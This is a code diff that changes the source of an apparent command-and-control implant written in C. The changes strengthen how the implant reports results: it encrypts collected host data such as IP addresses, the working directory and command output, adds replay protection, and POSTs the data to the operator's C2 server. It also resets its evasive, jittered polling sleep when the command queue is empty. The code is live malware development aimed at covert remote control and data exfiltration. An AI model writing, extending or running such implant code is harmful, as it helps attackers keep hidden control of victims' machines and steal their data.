@@ -92,11 +92,24 @@ static void report_result(const bsb_config_t *cfg, const char *command, const ch
         return;
     }
 
+    /* Replay protection: increment message counter and get timestamp */
+    static uint64_t message_counter = 0;
+    message_counter++;
+    uint64_t timestamp = (uint64_t)time(NULL);
+
     unsigned char iv_out[16];
-    RAND_bytes(iv_out, 16);
+    if (!bsb_generate_secure_iv(iv_out))
+    {
+        fprintf(stderr, "[!] Failed to generate secure IV, aborting report\n");
+        free(json_str);
+        free(ips);
+        free(pwd);
+        return;
+    }
     int encrypted_len = 0;
-    unsigned char *encrypted_resp = aes256_cfb_encrypt(
-        cfg->crypto.key, iv_out, (unsigned char *)json_str, strlen(json_str), &encrypted_len);
+    unsigned char *encrypted_resp = aes256_cfb_encrypt_replay(
+        cfg->crypto.encryption_key, iv_out, (unsigned char *)json_str, strlen(json_str),
+        message_counter, timestamp, &encrypted_len);
 
     if (encrypted_resp)
     {
@@ -108,19 +121,13 @@ static void report_result(const bsb_config_t *cfg, const char *command, const ch
         if (b64_resp)
         {
             char report_url[BSB_MAX_URL + BSB_MAX_URI + 8192];
-            snprintf(report_url, sizeof(report_url), "%s%s", cfg->c2.url, cfg->c2.report_uri);
-            size_t base_len = strlen(report_url);
-            size_t b64_len = strlen(b64_resp);
-            size_t enc_len = 0;
-            char *b64_encoded = url_encode(b64_resp, b64_len, &enc_len);
-            if (b64_encoded && base_len + enc_len + 1 <= sizeof(report_url))
-            {
-                memcpy(report_url + base_len, b64_encoded, enc_len);
-                report_url[base_len + enc_len] = '\0';
-                http_response_t resp = https_request(cfg, report_url, "POST", NULL);
-                free(resp.data);
-                free(b64_encoded);
-            }
+            snprintf(report_url, sizeof(report_url), "%s%s",
+                     cfg->c2.url, cfg->c2.report_uri);
+            /* Pathable C2 (/command/<client_id>) matches the client id
+             * from the route, so the encrypted payload must travel in
+             * the POST body, never appended to the URL segment. */
+            http_response_t resp = https_request(cfg, report_url, "POST", b64_resp);
+            free(resp.data);
             free(b64_resp);
         }
         free(full_enc);
@@ -253,7 +260,10 @@ int main(void)
         if (!plaintext || strlen(plaintext) == 0)
         {
             free(plaintext);
-            evasive_sleep(bsb_backoff_next(&backoff));
+            /* Empty command queue is a healthy response: reset backoff
+             * and keep the normal jittered polling cadence. */
+            bsb_backoff_reset(&backoff);
+            evasive_sleep(bsb_config_sleep_seconds(&cfg));
             continue;
         }
 
